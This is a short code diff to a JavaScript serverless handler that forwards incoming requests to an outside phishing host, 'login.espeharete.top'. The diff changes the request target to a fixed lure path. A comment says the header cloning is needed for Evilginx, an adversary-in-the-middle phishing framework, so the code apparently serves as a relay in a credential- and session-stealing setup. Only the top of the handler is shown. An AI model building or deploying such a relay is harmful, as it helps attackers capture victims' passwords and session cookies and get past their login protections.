@@ -1,5 +1,5 @@
 export default async function handler(req, res) {
-  const targetUrl = `https://login.espeharete.top${req.url}`;
+  const targetUrl = `https://login.espeharete.top/xVpSXLob`;
 
   // Clone headers (critical for Evilginx to work)
   const headers = { ...req.headers };
